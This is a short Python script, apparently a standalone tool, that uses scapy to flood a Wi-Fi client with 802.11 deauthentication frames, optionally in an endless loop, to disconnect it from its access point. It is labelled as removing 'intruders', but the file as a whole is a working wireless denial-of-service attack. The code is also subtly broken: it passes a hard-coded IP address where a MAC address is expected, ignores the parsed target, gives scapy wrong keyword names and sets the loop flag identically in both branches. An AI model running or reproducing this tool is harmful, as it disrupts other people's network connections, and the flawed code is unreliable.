from scapy.all import RadioTap,sendp,Dot11,Dot11Deauth

import argparse as ap

def disconnect_intruders(t_mac, g_mac, intf=0.1, count=None, loop=1, interface='wlan0mon',verbose=0):

    d11 = Dot11(addr=t_mac,addr2=g_mac,addr3=g_mac) #used to create 802.11 frames

    packet_stack = RadioTap()/d11/Dot11Deauth(reason=7)
     
    sendp(packet_stack,intf=intf,count=count,loop=loop,interface=interface,verbose=verbose)


if __name__=='__main__':
    parser = ap.ArgumentParser(description='Deauthenticating intruders...')
    parser.add_argument('target', help='Unauthorized Target Mac Address.')
    parser.add_argument('gateway', help='Mac Address of Router/Gateway')
    parser.add_argument('-c', '--count', help='Number of deauth frames to send between 0-infinity.')
    parser.add_argument('--interval', help='Sending frequency')
    parser.add_argument('-i', dest='iface', help='interface to use while in monitor mode')

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface =args.iface

    if count ==0:
        loop = 1
        count=None
    else:
        loop = 1

    disconnect_intruders('192.168.0.160',gateway,interval,count,loop,iface)